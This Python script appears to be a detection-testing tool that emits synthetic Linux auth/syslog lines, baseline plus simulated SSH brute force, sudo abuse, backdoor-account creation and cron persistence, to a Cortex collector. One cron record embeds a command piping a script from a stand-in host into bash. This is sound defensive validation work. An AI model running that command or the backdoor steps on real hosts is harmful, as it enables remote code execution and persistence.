#!/usr/bin/env python3
"""
linux_syslog_emitter — fake Linux host (auth/syslog) data source that streams
shape-true records to Cortex XSIAM/XDR over **syslog** (collector / Broker VM).

Many Linux attacks are first visible not in the endpoint-agent process feed but in
the host's **syslog / auth log** that is forwarded to a Cortex Broker VM syslog
applet (sshd auth, sudo, su, cron, useradd/usermod, PAM) and parsed into the
``linux_syslog`` dataset. This emitter lets a DC validate the **collector/log-level**
detections for those attacks without a real host or tenant — it generates authentic
RFC3164/5424 Linux auth-log lines (a learned-normal baseline + the attacker lines)
and sends them to an operator-supplied collector. Mirrors ``esxi_syslog_emitter`` and
the analytics log-streamer family.

Safety: no host is touched, no command runs — every record is a syslog STRING. Default
collector is TEST-NET-1 (192.0.2.0/24); ``--dry-run`` prints without opening a socket.
stdlib only.

Record shape (what Cortex parses into ``linux_syslog``):
    <38>1 2026-11-12T04:00:00Z web01 sshd 1123 - - Failed password for invalid user admin from 198.51.100.7 port 51234 ssh2
    <85>1 2026-11-12T04:00:05Z web01 sudo 2201 - - pam_unix(sudo:auth): authentication failure; logname=www-data uid=33 ... user=root
"""
from __future__ import annotations

import argparse, random, socket, sys, time
from datetime import datetime, timezone

HOST = "web01"
# learned-normal baseline the per-host/user analytics trains on
BASELINE = [
    ("sshd", "Accepted publickey for deploy from 10.0.0.5 port 44002 ssh2"),
    ("sudo", "deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx"),
    ("cron", "(root) CMD (/usr/lib/sysstat/sa1 1 1)"),
    ("systemd", "Started Session 42 of user deploy."),
    ("sshd", "pam_unix(sshd:session): session opened for user deploy by (uid=0)"),
]
# attacker lines, grouped by the log-level detection they exercise
ATTACKS = {
    "ssh-brute-force": [("sshd", f"Failed password for invalid user {u} from 198.51.100.7 port {p} ssh2")
                        for u, p in (("admin", 51234), ("root", 51240), ("oracle", 51251),
                                     ("test", 51262), ("postgres", 51270), ("ubuntu", 51281))]
                       + [("sshd", "Accepted password for root from 198.51.100.7 port 51290 ssh2")],
    "sudo-brute-force": [("sudo", "pam_unix(sudo:auth): authentication failure; logname=www-data uid=33 euid=0 tty=/dev/pts/1 ruser=www-data rhost= user=root")] * 5
                        + [("sudo", "www-data : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash")],
    "new-local-account": [("useradd", "new user: name=svc-backdoor, UID=0, GID=0, home=/home/svc-backdoor, shell=/bin/bash"),
                          ("usermod", "add 'svc-backdoor' to group 'sudo'"),
                          ("passwd", "password for 'svc-backdoor' changed by 'root'")],
    "cron-persistence": [("crontab", "(www-data) REPLACE (www-data)"),
                         ("cron", "(www-data) CMD (curl -s http://192.0.2.1/p.sh | bash)")],
    "pam-su-root": [("su", "pam_unix(su:session): session opened for user root by www-data(uid=33)"),
                    ("su", "+ /dev/pts/2 www-data:root")],
    "setuid-privesc": [("kernel", "audit: type=1320 setuid file /tmp/.x/rootshell perm change uid=0"),
                       ("sudo", "www-data : command not allowed ; COMMAND=/tmp/.x/rootshell")],
}
_PRIO = {"sshd": 38, "sudo": 85, "su": 85, "cron": 78, "crontab": 78, "systemd": 30,
         "useradd": 86, "usermod": 86, "passwd": 86, "kernel": 0}


def _line(proc: str, msg: str) -> str:
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    pid = random.randint(1000, 9999)
    return f"<{_PRIO.get(proc, 13)}>1 {ts} {HOST} {proc} {pid} - - {msg}"


def build(phase: str, which: str, baseline_n: int):
    if phase in ("baseline", "both"):
        for _ in range(baseline_n):
            p, m = random.choice(BASELINE)
            yield _line(p, m), "baseline"
    if phase in ("attack", "both"):
        groups = ATTACKS if which == "all" else {which: ATTACKS.get(which, [])}
        for tag, lines in groups.items():
            for p, m in lines:
                yield _line(p, m), tag


def send(records, collector, port, proto, pace, dry):
    n = 0; s = None
    if not dry:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if proto == "udp" else socket.SOCK_STREAM)
        if proto == "tcp": s.connect((collector, port))
    try:
        for rec, tag in records:
            if dry: print(f"[{tag:18}] {rec}")
            else:
                data = (rec + "\n").encode("utf-8", "replace")
                s.sendto(data, (collector, port)) if proto == "udp" else s.sendall(data)
            n += 1
            if pace and not dry: time.sleep(pace)
    finally:
        if s: s.close()
    return n


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="Fake Linux auth/syslog data source for Cortex collector/log-level validation.")
    ap.add_argument("--collector", default="192.0.2.9"); ap.add_argument("--port", type=int, default=514)
    ap.add_argument("--proto", choices=["udp", "tcp"], default="udp")
    ap.add_argument("--phase", choices=["baseline", "attack", "both"], default="both")
    ap.add_argument("--which", default="all", choices=["all", *ATTACKS.keys()],
                    help="which attacker log pattern to emit")
    ap.add_argument("--baseline-count", type=int, default=40)
    ap.add_argument("--pace", type=float, default=0.0); ap.add_argument("--dry-run", action="store_true")
    a = ap.parse_args(argv)
    recs = list(build(a.phase, a.which, a.baseline_count))
    n = send(recs, a.collector, a.port, a.proto, a.pace, a.dry_run)
    atk = sum(1 for _, t in recs if t != "baseline")
    where = "(dry-run)" if a.dry_run else f"-> {a.proto}://{a.collector}:{a.port}"
    print(f"\nlinux syslog: {n} records {where}  ({n-atk} baseline, {atk} attacker)", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
